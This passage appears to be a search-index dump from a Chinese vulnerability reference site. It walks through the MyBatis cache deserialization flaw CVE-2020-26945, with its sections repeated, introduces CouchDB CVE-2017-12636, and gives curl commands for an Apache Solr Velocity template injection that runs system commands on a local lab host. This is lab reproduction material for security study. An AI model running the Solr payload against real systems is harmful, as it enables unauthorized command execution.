\u8fc1\u79fb\u5230\u4e86Google Code\uff0c\u5e76\u4e14\u6539\u540d\u4e3aMyBatis\u3002MyBatis\u662f\u4e00\u6b3e\u4f18\u79c0\u7684\u6301\u4e45\u5c42\u6846\u67b6\uff0c\u5b83\u652f\u6301\u5b9a\u5236\u5316SQL\u3001\u5b58\u50a8\u8fc7\u7a0b\u4ee5\u53ca\u9ad8\u7ea7\u6620\u5c04\u3002MyBatis\u907f\u514d\u4e86\u51e0\u4e4e\u6240\u6709\u7684JDBC\u4ee3\u7801\u548c\u624b\u52a8\u8bbe\u7f6e\u53c2\u6570\u4ee5\u53ca\u83b7\u53d6\u7ed3\u679c\u96c6\u3002MyBatis\u53ef\u4ee5\u4f7f\u7528\u7b80\u5355\u7684XML\u6216\u6ce8\u89e3\u6765\u914d\u7f6e\u548c\u6620\u5c04\u539f\u751f\u4fe1\u606f\uff0c\u5c06\u63a5\u53e3\u548c Java \u7684 POJOs(Plain Ordinary Java Object,\u666e\u901a\u7684 Java\u5bf9\u8c61)\u6620\u5c04\u6210\u6570\u636e\u5e93\u4e2d\u7684\u8bb0\u5f55\u3002 \u6f0f\u6d1e\u63cf\u8ff02020\u5e7410\u67086\u65e5\uff0cMyBatis\u5b98\u65b9\u53d1\u5e03\u4e86MyBatis 3.5.6\u7248\u672c\uff0c\u4fee\u590d\u4e86\u4e00\u4e2a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u7f16\u53f7\u4e3aCVE-2020-26945\u3002 \u5229\u7528\u6761\u4ef6 \u00b6 \u7528\u6237\u542f\u7528\u4e86\u4e8c\u7ea7\u7f13\u5b58\u529f\u80fd \u653b\u51fb\u8005\u53ef\u4ee5\u4fee\u6539\u7f13\u5b58\u7684\u5185\u5bb9\uff0c\u66ff\u6362\u4e3a\u6076\u610f\u53cd\u5e8f\u5217\u5316\u6570\u636e \u7528\u6237\u672a\u8bbe\u7f6eJEP-290\u8fc7\u6ee4\uff0c\u4e14\u6ca1\u6709\u4efb\u4f55\u9632\u5fa1\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684\u63aa\u65bd 0x02 \u5206\u6790 \u00b6 \u4e8c\u7ea7\u7f13\u5b58\u5176\u5b9e\u5c31\u662f\u5c06\u67e5\u8be2\u7684\u7ed3\u679c\uff0c\u653e\u5165\u7f13\u5b58\u4e2d\uff0c\u4e0b\u6b21\u67e5\u8be2\u76f8\u540c\u7684\u6761\u4ef6\u65f6\uff0c\u76f4\u63a5\u4ece\u7f13\u5b58\u4e2d\u83b7\u53d6\u7ed3\u679c\uff0c\u964d\u4f4esql\u670d\u52a1\u5668\u7684\u538b\u529b\u3002\u5982\u4e0a\u56fe\u6240\u793a\uff0c\u4e8c\u7ea7\u7f13\u5b58\u53ef\u4ee5\u7f13\u5b58\u5728redis\u7b49kv\u6570\u636e\u5e93\uff0c\u4e5f\u53ef\u4ee5\u6211\u4eec\u81ea\u5df1\u5b9e\u73b0\u76f8\u5173\u7f13\u5b58\u3002 \u5982\u679c\u6211\u4eec\u9700\u8981\u81ea\u5b9a\u4e49\u7f13\u5b58\uff0c\u53ea\u9700\u8981\u96c6\u6210\u5982\u4e0b\u63a5\u53e3\u5373\u53ef public interface Cache { String getId(); int getSize(); void putObject(Object key, Object value); Object getObject(Object key); boolean hasKey(Object key); Object removeObject(Object key); void clear(); } \u4e8c\u7ea7\u7f13\u5b58\u9ed8\u8ba4\u662f\u4e0d\u5f00\u542f\u7684\uff0c\u9700\u8981\u624b\u52a8\u5f00\u542f\u4e8c\u7ea7\u7f13\u5b58\uff0c\u5b9e\u73b0\u4e8c\u7ea7\u7f13\u5b58\u7684\u65f6\u5019\uff0cMyBatis\u8981\u6c42\u8fd4\u56de\u7684POJO\u5fc5\u987b\u662f\u53ef\u5e8f\u5217\u5316\u7684\u3002\u5f00\u542f\u4e8c\u7ea7\u7f13\u5b58\u7684\u6761\u4ef6\u4e5f\u662f\u6bd4\u8f83\u7b80\u5355\uff0c\u901a\u8fc7\u76f4\u63a5\u5728 MyBatis \u914d\u7f6e\u6587\u4ef6\u4e2d\u901a\u8fc7 <settings> <setting name = \"cacheEnabled\" value = \"true\" /></settings> \u6765\u5f00\u542f\u4e8c\u7ea7\u7f13\u5b58\uff0c\u8fd8\u9700\u8981\u5728 Mapper \u7684xml \u914d\u7f6e\u6587\u4ef6\u4e2d\u52a0\u5165 <cache> \u6807\u7b7e \u4e8c\u7ea7\u7f13\u5b58\u4e2d\uff0c\u88ab\u7f13\u5b58\u7684\u5bf9\u8c61\u5fc5\u987b\u662f\u7ee7\u627f\u81ea Serializable \u63a5\u53e3\uff0c\u7f13\u5b58\u7684\u8fc7\u7a0b\u5176\u5b9e\u5c31\u662f\u5c06POJO\u53cd\u5e8f\u5217\u5316\u540e\uff0c\u5b58\u5165\u7f13\u5b58\u4e2d\u3002 0x03 \u590d\u73b0 \u00b6 \u5728\u7f51\u4e0a\u968f\u4fbf\u4e0b\u8f7d\u4e00\u4e2aspring boot \u4e8c\u7ea7\u7f13\u5b58\u7684\u5b66\u4e60\u9879\u76ee\uff0c\u672c\u5730\u642d\u5efa\u5c31\u884c\u3002\u6211\u7528 https://github.com/Lovelcp/spring-boot-mybatis-with-redis \u642d\u5efa \u4fee\u6539 ProductMapper.xml \u914d\u7f6e\u6587\u4ef6\u5982\u4e0b <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"> <mapper namespace=\"com.wooyoo.learning.dao.mapper.ProductMapper\"> <cache type=\"org.apache.ibatis.cache.impl.PerpetualCache\"/> <select id=\"select\" resultType=\"Product\"> SELECT * FROM products WHERE id = #{id} LIMIT 1 </select> <update id=\"update\" parameterType=\"Product\" flushCache=\"true\"> UPDATE products SET name = #{name}, price = #{price} WHERE id = #{id} LIMIT 1 </update> </mapper> \u7136\u540e\u5728 org.apache.ibatis.cache.impl.PerpetualCache \u76f8\u5173\u4f4d\u7f6e\u6253\u4e0a\u65ad\u70b9 \u8bbe\u7f6e\u597dmysql\u6570\u636e\u5e93\uff0c\u5efa\u5e93\u5efa\u8868\uff0c\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 \u5982\u4e0b\u56fe\u6240\u793a application.yml spring: # \u6570\u636e\u5e93\u914d\u7f6e datasource: url: jdbc:mysql://192.168.3.254/test?autoReconnect=true&useSSL=false username: root password: 123456 driver-class-name: com.mysql.jdbc.Driver \u6d4f\u89c8\u5668\u8bbf\u95ee http://127.0.0.1:9999/product/1 \u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u4e8c\u7ea7\u7f13\u5b58\u751f\u6548\u4e86\uff0c\u5c06\u7ed3\u679c\u5df2\u7ecf\u5b58\u50a8\u5230\u6211\u4eec\u9884\u5148\u8bbe\u5b9a\u7684\u7f13\u5b58\u4e2d\uff0c\u622a\u56fe\u5982\u4e0b \u5f53\u7136\uff0ckey\u4e0evalue\u5e76\u6ca1\u6709\u88ab\u5e8f\u5217\u5316\uff0c\u56e0\u4e3a\u7cfb\u7edf\u9ed8\u8ba4\u7684\u8fd9\u4e2a\u7f13\u5b58\uff0c\u5e76\u4e0d\u4f1a\u5e8f\u5217\u5316\u53cd\u5e8f\u5217\u5316\u3002 \u4e0b\u9762\u6211\u4eec\u770b\u4e00\u4e0bmybatis \u5b98\u65b9redis mybatis/redis-cache \u7f13\u5b58\u63d2\u4ef6\uff0c\u76f8\u5173\u64cd\u4f5c @Override public void putObject(final Object key, final Object value) { execute(new RedisCallback() { @Override public Object doWithRedis(Jedis jedis) { final byte[] idBytes = id.getBytes(); jedis.hset(idBytes, key.toString().getBytes(), redisConfig.getSerializer().serialize(value)); if (timeout != null && jedis.ttl(idBytes) == -1) { jedis.expire(idBytes, timeout); } return null; } }); } @Override public Object getObject(final Object key) { return execute(new RedisCallback() { @Override public Object doWithRedis(Jedis jedis) { return redisConfig.getSerializer().unserialize(jedis.hget(id.getBytes(), key.toString().getBytes())); } }); } \u5728\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5f88\u660e\u663e\u7684\u770b\u51fa\uff0c\u5c06\u5bf9\u8c61\u53cd\u5e8f\u5217\u5316\u540e\u5b58\u50a8\u81f3redis\u670d\u52a1\u5668\u4e2d\u3002 \u66ff\u6362\u91cc\u9762\u7684\u6570\u636e\u4e3a\u6211\u4eec\u53cd\u5e8f\u5217\u5316\u7684\u653b\u51fb\u5185\u5bb9\u5373\u53ef\u3002 0x04 \u9632\u5fa1\u63aa\u65bd \u00b6 \u542f\u7528\u7684\u4e8c\u7ea7\u7f13\u5b58\u6ca1\u6709\u95ee\u9898\uff0c\u95ee\u9898\u5728\u4e8e\uff0c\u7f13\u5b58\u670d\u52a1\u5668**\u662f\u5426\u5141\u8bb8\u4efb\u610f\u7528\u6237\u8bbf\u95ee**\uff1f\uff1f \u5982\u679c\u786e\u8ba4\u81ea\u5df1\u7684\u4e1a\u52a1\u6ca1\u6709\u4e8c\u7ea7\u7f13\u5b58\u6216\u8005\u4e8c\u7ea7\u7f13\u5b58\u670d\u52a1\u5668\u5bf9\u5916\u4e0d\u53ef\u89c1\uff0c\u53ef\u4ee5\u6682\u65f6\u4e0d\u7528\u5904\u7406\u8be5\u6f0f\u6d1e \u5982\u679c\u4e8c\u7ea7\u7f13\u5b58\u670d\u52a1\u5668\u5bf9\u5916\uff0c\u91cd\u70b9\u68c0\u67e5\u7b2c\u4e09\u65b9\u7f13\u5b58\u662f\u5426\u4f7f\u7528java\u53cd\u5e8f\u5217\u5316 \u5410\u69fd \u00b6 \u67d0\u5b9e\u9a8c\u5ba4\uff0c\u4f60\u81ea\u5df1\u770b\u770b\u4f60\u7ffb\u8bd1\u7684\u90a3\u73a9\u610f\uff0c\u770b\u5b8c\u4e00\u8138\u61f5\u903c \u53c2\u8003 \u00b6 https://github.com/mybatis/mybatis-3/pull/2079","title":"CVE 2020 26945 mybatis\u4e8c\u7ea7\u7f13\u5b58\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2020-26945%20mybatis%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#cve-2020-26945-mybatis","text":"","title":"CVE-2020-26945 mybatis\u4e8c\u7ea7\u7f13\u5b58\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2020-26945%20mybatis%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x01","text":"MyBatis \u672c\u662fApache\u7684\u4e00\u4e2a\u5f00\u6e90\u9879\u76eeiBatis, 2010\u5e74\u8fd9\u4e2a\u9879\u76ee\u7531Apache Software Foundation \u8fc1\u79fb\u5230\u4e86Google Code\uff0c\u5e76\u4e14\u6539\u540d\u4e3aMyBatis\u3002MyBatis\u662f\u4e00\u6b3e\u4f18\u79c0\u7684\u6301\u4e45\u5c42\u6846\u67b6\uff0c\u5b83\u652f\u6301\u5b9a\u5236\u5316SQL\u3001\u5b58\u50a8\u8fc7\u7a0b\u4ee5\u53ca\u9ad8\u7ea7\u6620\u5c04\u3002MyBatis\u907f\u514d\u4e86\u51e0\u4e4e\u6240\u6709\u7684JDBC\u4ee3\u7801\u548c\u624b\u52a8\u8bbe\u7f6e\u53c2\u6570\u4ee5\u53ca\u83b7\u53d6\u7ed3\u679c\u96c6\u3002MyBatis\u53ef\u4ee5\u4f7f\u7528\u7b80\u5355\u7684XML\u6216\u6ce8\u89e3\u6765\u914d\u7f6e\u548c\u6620\u5c04\u539f\u751f\u4fe1\u606f\uff0c\u5c06\u63a5\u53e3\u548c Java \u7684 POJOs(Plain Ordinary Java Object,\u666e\u901a\u7684 Java\u5bf9\u8c61)\u6620\u5c04\u6210\u6570\u636e\u5e93\u4e2d\u7684\u8bb0\u5f55\u3002 \u6f0f\u6d1e\u63cf\u8ff02020\u5e7410\u67086\u65e5\uff0cMyBatis\u5b98\u65b9\u53d1\u5e03\u4e86MyBatis 3.5.6\u7248\u672c\uff0c\u4fee\u590d\u4e86\u4e00\u4e2a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u7f16\u53f7\u4e3aCVE-2020-26945\u3002","title":"0x01 \u7b80\u4ecb"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2020-26945%20mybatis%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_1","text":"\u7528\u6237\u542f\u7528\u4e86\u4e8c\u7ea7\u7f13\u5b58\u529f\u80fd \u653b\u51fb\u8005\u53ef\u4ee5\u4fee\u6539\u7f13\u5b58\u7684\u5185\u5bb9\uff0c\u66ff\u6362\u4e3a\u6076\u610f\u53cd\u5e8f\u5217\u5316\u6570\u636e \u7528\u6237\u672a\u8bbe\u7f6eJEP-290\u8fc7\u6ee4\uff0c\u4e14\u6ca1\u6709\u4efb\u4f55\u9632\u5fa1\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684\u63aa\u65bd","title":"\u5229\u7528\u6761\u4ef6"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2020-26945%20mybatis%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x02","text":"\u4e8c\u7ea7\u7f13\u5b58\u5176\u5b9e\u5c31\u662f\u5c06\u67e5\u8be2\u7684\u7ed3\u679c\uff0c\u653e\u5165\u7f13\u5b58\u4e2d\uff0c\u4e0b\u6b21\u67e5\u8be2\u76f8\u540c\u7684\u6761\u4ef6\u65f6\uff0c\u76f4\u63a5\u4ece\u7f13\u5b58\u4e2d\u83b7\u53d6\u7ed3\u679c\uff0c\u964d\u4f4esql\u670d\u52a1\u5668\u7684\u538b\u529b\u3002\u5982\u4e0a\u56fe\u6240\u793a\uff0c\u4e8c\u7ea7\u7f13\u5b58\u53ef\u4ee5\u7f13\u5b58\u5728redis\u7b49kv\u6570\u636e\u5e93\uff0c\u4e5f\u53ef\u4ee5\u6211\u4eec\u81ea\u5df1\u5b9e\u73b0\u76f8\u5173\u7f13\u5b58\u3002 \u5982\u679c\u6211\u4eec\u9700\u8981\u81ea\u5b9a\u4e49\u7f13\u5b58\uff0c\u53ea\u9700\u8981\u96c6\u6210\u5982\u4e0b\u63a5\u53e3\u5373\u53ef public interface Cache { String getId(); int getSize(); void putObject(Object key, Object value); Object getObject(Object key); boolean hasKey(Object key); Object removeObject(Object key); void clear(); } \u4e8c\u7ea7\u7f13\u5b58\u9ed8\u8ba4\u662f\u4e0d\u5f00\u542f\u7684\uff0c\u9700\u8981\u624b\u52a8\u5f00\u542f\u4e8c\u7ea7\u7f13\u5b58\uff0c\u5b9e\u73b0\u4e8c\u7ea7\u7f13\u5b58\u7684\u65f6\u5019\uff0cMyBatis\u8981\u6c42\u8fd4\u56de\u7684POJO\u5fc5\u987b\u662f\u53ef\u5e8f\u5217\u5316\u7684\u3002\u5f00\u542f\u4e8c\u7ea7\u7f13\u5b58\u7684\u6761\u4ef6\u4e5f\u662f\u6bd4\u8f83\u7b80\u5355\uff0c\u901a\u8fc7\u76f4\u63a5\u5728 MyBatis \u914d\u7f6e\u6587\u4ef6\u4e2d\u901a\u8fc7 <settings> <setting name = \"cacheEnabled\" value = \"true\" /></settings> \u6765\u5f00\u542f\u4e8c\u7ea7\u7f13\u5b58\uff0c\u8fd8\u9700\u8981\u5728 Mapper \u7684xml \u914d\u7f6e\u6587\u4ef6\u4e2d\u52a0\u5165 <cache> \u6807\u7b7e \u4e8c\u7ea7\u7f13\u5b58\u4e2d\uff0c\u88ab\u7f13\u5b58\u7684\u5bf9\u8c61\u5fc5\u987b\u662f\u7ee7\u627f\u81ea Serializable \u63a5\u53e3\uff0c\u7f13\u5b58\u7684\u8fc7\u7a0b\u5176\u5b9e\u5c31\u662f\u5c06POJO\u53cd\u5e8f\u5217\u5316\u540e\uff0c\u5b58\u5165\u7f13\u5b58\u4e2d\u3002","title":"0x02 \u5206\u6790"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2020-26945%20mybatis%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x03","text":"\u5728\u7f51\u4e0a\u968f\u4fbf\u4e0b\u8f7d\u4e00\u4e2aspring boot \u4e8c\u7ea7\u7f13\u5b58\u7684\u5b66\u4e60\u9879\u76ee\uff0c\u672c\u5730\u642d\u5efa\u5c31\u884c\u3002\u6211\u7528 https://github.com/Lovelcp/spring-boot-mybatis-with-redis \u642d\u5efa \u4fee\u6539 ProductMapper.xml \u914d\u7f6e\u6587\u4ef6\u5982\u4e0b <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"> <mapper namespace=\"com.wooyoo.learning.dao.mapper.ProductMapper\"> <cache type=\"org.apache.ibatis.cache.impl.PerpetualCache\"/> <select id=\"select\" resultType=\"Product\"> SELECT * FROM products WHERE id = #{id} LIMIT 1 </select> <update id=\"update\" parameterType=\"Product\" flushCache=\"true\"> UPDATE products SET name = #{name}, price = #{price} WHERE id = #{id} LIMIT 1 </update> </mapper> \u7136\u540e\u5728 org.apache.ibatis.cache.impl.PerpetualCache \u76f8\u5173\u4f4d\u7f6e\u6253\u4e0a\u65ad\u70b9 \u8bbe\u7f6e\u597dmysql\u6570\u636e\u5e93\uff0c\u5efa\u5e93\u5efa\u8868\uff0c\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 \u5982\u4e0b\u56fe\u6240\u793a application.yml spring: # \u6570\u636e\u5e93\u914d\u7f6e datasource: url: jdbc:mysql://192.168.3.254/test?autoReconnect=true&useSSL=false username: root password: 123456 driver-class-name: com.mysql.jdbc.Driver \u6d4f\u89c8\u5668\u8bbf\u95ee http://127.0.0.1:9999/product/1 \u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u4e8c\u7ea7\u7f13\u5b58\u751f\u6548\u4e86\uff0c\u5c06\u7ed3\u679c\u5df2\u7ecf\u5b58\u50a8\u5230\u6211\u4eec\u9884\u5148\u8bbe\u5b9a\u7684\u7f13\u5b58\u4e2d\uff0c\u622a\u56fe\u5982\u4e0b \u5f53\u7136\uff0ckey\u4e0evalue\u5e76\u6ca1\u6709\u88ab\u5e8f\u5217\u5316\uff0c\u56e0\u4e3a\u7cfb\u7edf\u9ed8\u8ba4\u7684\u8fd9\u4e2a\u7f13\u5b58\uff0c\u5e76\u4e0d\u4f1a\u5e8f\u5217\u5316\u53cd\u5e8f\u5217\u5316\u3002 \u4e0b\u9762\u6211\u4eec\u770b\u4e00\u4e0bmybatis \u5b98\u65b9redis mybatis/redis-cache \u7f13\u5b58\u63d2\u4ef6\uff0c\u76f8\u5173\u64cd\u4f5c @Override public void putObject(final Object key, final Object value) { execute(new RedisCallback() { @Override public Object doWithRedis(Jedis jedis) { final byte[] idBytes = id.getBytes(); jedis.hset(idBytes, key.toString().getBytes(), redisConfig.getSerializer().serialize(value)); if (timeout != null && jedis.ttl(idBytes) == -1) { jedis.expire(idBytes, timeout); } return null; } }); } @Override public Object getObject(final Object key) { return execute(new RedisCallback() { @Override public Object doWithRedis(Jedis jedis) { return redisConfig.getSerializer().unserialize(jedis.hget(id.getBytes(), key.toString().getBytes())); } }); } \u5728\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5f88\u660e\u663e\u7684\u770b\u51fa\uff0c\u5c06\u5bf9\u8c61\u53cd\u5e8f\u5217\u5316\u540e\u5b58\u50a8\u81f3redis\u670d\u52a1\u5668\u4e2d\u3002 \u66ff\u6362\u91cc\u9762\u7684\u6570\u636e\u4e3a\u6211\u4eec\u53cd\u5e8f\u5217\u5316\u7684\u653b\u51fb\u5185\u5bb9\u5373\u53ef\u3002","title":"0x03 \u590d\u73b0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2020-26945%20mybatis%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x04","text":"\u542f\u7528\u7684\u4e8c\u7ea7\u7f13\u5b58\u6ca1\u6709\u95ee\u9898\uff0c\u95ee\u9898\u5728\u4e8e\uff0c\u7f13\u5b58\u670d\u52a1\u5668**\u662f\u5426\u5141\u8bb8\u4efb\u610f\u7528\u6237\u8bbf\u95ee**\uff1f\uff1f \u5982\u679c\u786e\u8ba4\u81ea\u5df1\u7684\u4e1a\u52a1\u6ca1\u6709\u4e8c\u7ea7\u7f13\u5b58\u6216\u8005\u4e8c\u7ea7\u7f13\u5b58\u670d\u52a1\u5668\u5bf9\u5916\u4e0d\u53ef\u89c1\uff0c\u53ef\u4ee5\u6682\u65f6\u4e0d\u7528\u5904\u7406\u8be5\u6f0f\u6d1e \u5982\u679c\u4e8c\u7ea7\u7f13\u5b58\u670d\u52a1\u5668\u5bf9\u5916\uff0c\u91cd\u70b9\u68c0\u67e5\u7b2c\u4e09\u65b9\u7f13\u5b58\u662f\u5426\u4f7f\u7528java\u53cd\u5e8f\u5217\u5316","title":"0x04 \u9632\u5fa1\u63aa\u65bd"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2020-26945%20mybatis%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_2","text":"\u67d0\u5b9e\u9a8c\u5ba4\uff0c\u4f60\u81ea\u5df1\u770b\u770b\u4f60\u7ffb\u8bd1\u7684\u90a3\u73a9\u610f\uff0c\u770b\u5b8c\u4e00\u8138\u61f5\u903c","title":"\u5410\u69fd"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/CVE-2020-26945%20mybatis%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_3","text":"https://github.com/mybatis/mybatis-3/pull/2079","title":"\u53c2\u8003"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/%E9%9C%80%E8%A6%81solr%E4%BB%A5cloud%E6%A8%A1%E5%BC%8F%E5%90%AF%E5%8A%A8%EF%BC%8C%E7%89%B9%E5%BE%81%E6%98%AF%EF%BC%9A/","text":"\u9700\u8981solr\u4ee5cloud\u6a21\u5f0f\u542f\u52a8\uff0c\u7279\u5f81\u662f\uff1a \u4f1a\u6709\u4e00\u4e2acloud\u7684\u529f\u80fd \u3002 \u7f16\u8bd1\u4e00\u4e2a\u6076\u610f\u914d\u7f6e\uff1a \u5728\u5bf9\u5e94\u76ee\u5f55\u4e0b\u4f9d\u6b21\u6267\u884c\u4ee5\u4e0bshell\u547d\u4ee4\u3002 /solr-7.7.0/server/solr/configsets/sample_techproducts_configs/conf zip -r - * > mytest.zip curl -X POST --header \"Content-Type:application/octet-stream\" --data-binary @mytest .zip \" http://127.0.0.1:8983/solr/admin/configs?action=UPLOAD&name=mytest \" #\u6ce8\u518c\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\u96c6\u5408\u4e3amytest curl \" http://127.0.0.1:8983/api/cluster/configs?omitHeader=true \" #\u67e5\u8be2\u914d\u7f6e\u6587\u4ef6\u96c6\u5408\u662f\u5426\u4e0a\u4f20\u6210\u529f curl \" http://127.0.0.1:8983/solr/admin/configs?action=CREATE&name=mytest2&baseConfigSet=mytest&configSetProp.immutable=false&wt=xml&omitHeader=true \" curl \" http://127.0.0.1:8983/solr/admin/collections?action=CREATE&name=mytest&numShards=1&replicationFactor=1&wt=xml&collection.configName=mytest2 \" #\u4f7f\u7528\u4e4b\u524d\u4e0a\u4f20\u7684\u914d\u7f6e\u6587\u4ef6\u96c6\u5408\u4e3amytest curl -v \" http://127.0.0.1:8983/solr/mytest/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set ( \\(x='')+%23set(\\) rt= \\(x.class.forName('java.lang.Runtime'))+%23set(\\) chr= \\(x.class.forName(%27java.lang.Character%27))+%23set(\\) str= \\(x.class.forName(%27java.lang.String%27))+%23set(\\) ex= \\(rt.getRuntime().exec(%27id%27))+\\) ex.waitFor()+%23set( \\(out=\\) ex.getInputStream())+%23foreach( \\(i+in+[1..\\) out.available()]) \\(str.valueOf(\\) chr.toChars($out.read()))%23end\" \u6700\u540e\u6267\u884c\u547d\u4ee4\uff1a","title":"\u9700\u8981solr\u4ee5cloud\u6a21\u5f0f\u542f\u52a8\uff0c\u7279\u5f81\u662f\uff1a"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Couchdb%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2017-12636/Apache%20couchdb%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2017-12636%EF%BC%89/","text":"Apache couchdb \u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08cve-2017-12636\uff09 \u00b6 Apache CouchDB\u662f\u4e00\u4e2a\u5f00\u6e90\u6570\u636e\u5e93\uff0c\u4e13\u6ce8\u4e8e\u6613\u7528\u6027\u548c\u6210\u4e3a\"\u5b8c\u5168\u62e5\u62b1web\u7684\u6570\u636e\u5e93\"\u3002\u5b83\u662f\u4e00\u4e2a\u4f7f\u7528JSON\u4f5c\u4e3a\u5b58\u50a8\u683c\u5f0f\uff0cJavaScript\u4f5c\u4e3a\u67e5\u8be2\u8bed\u8a00\uff0cMapReduce\u548cHTTP\u4f5c\u4e3aAPI\u7684NoSQL\u6570\u636e\u5e93\u3002\u5e94\u7528\u5e7f\u6cdb\uff0c\u5982BBC\u7528\u5728\u5176\u52a8\u6001\u5185\u5bb9\u5c55\u793a\u5e73\u53f0\uff0cCredit Suisse\u7528\u5728\u5176\u5185\u90e8\u7684\u5546\u54c1\u90e8\u95e8\u7684\u5e02\u573a\u6846\u67b6\uff0cMeebo\uff0c\u7528\u5728\u5176\u793e\u4ea4\u5e73\u53f0\uff08web\u548c\u5e94\u7528\u7a0b\u5e8f\uff09\u3002 \u57282017\u5e7411\u670815\u65e5\uff0cCVE-2017-12635\u548cCVE-2017-12636\u62ab\u9732\uff0cCVE-2017-12636\u662f\u4e00\u4e2a\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7config api\u4fee\u6539couchdb\u7684\u914d\u7f6e query_server \uff0c\u8fd9\u4e2a\u914d\u7f6e\u9879\u5728\u8bbe\u8ba1\u3001\u6267\u884cview\u7684\u65f6\u5019\u5c06\u88ab\u8fd0\u884c\u3002 \u5f71\u54cd\u7248\u672c\uff1a\u5c0f\u4e8e 1.7.0 \u4ee5\u53ca \u5c0f\u4e8e 2.1.1 \u53c2\u8003\u94fe\u63a5\uff1a http://bobao.360.cn/learning/detail/4716.html https://justi.cz/security/2017/11/14/couchdb-rce-npm.html \u6d4b\u8bd5\u73af\u5883 \u00b6 Couchdb 2.x\u548c\u548c1.x\u7684API\u63a5\u53e3\u6709\u4e00\u5b9a\u533a\u522b\uff0c\u6240\u4ee5\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u5229\u7528\u65b9\u5f0f\u4e5f\u4e0d\u540c\u3002\u672c\u73af\u5883\u542f\u52a8\u7684\u662f1.6.0\u7248\u672c\uff0c\u5982\u679c\u4f60\u60f3\u6d4b\u8bd52.1.0\u7248\u672c\uff0c\u53ef\u4ee5\u542f\u52a8 CVE-2017-12635 \u9644\u5e26\u7684\u73af\u5883\u3002 \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u542f\u52a8Couchdb 1.6.0\u73af\u5883\uff1a docker-compose up -d \u542f\u52a8\u5b8c\u6210\u540e\uff0c\u8bbf\u95ee http://your-ip:5984/ \u5373\u53ef\u770b\u5230Couchdb\u7684\u6b22\u8fce\u9875\u9762\u3002 \u6f0f\u6d1e\u590d\u73b0 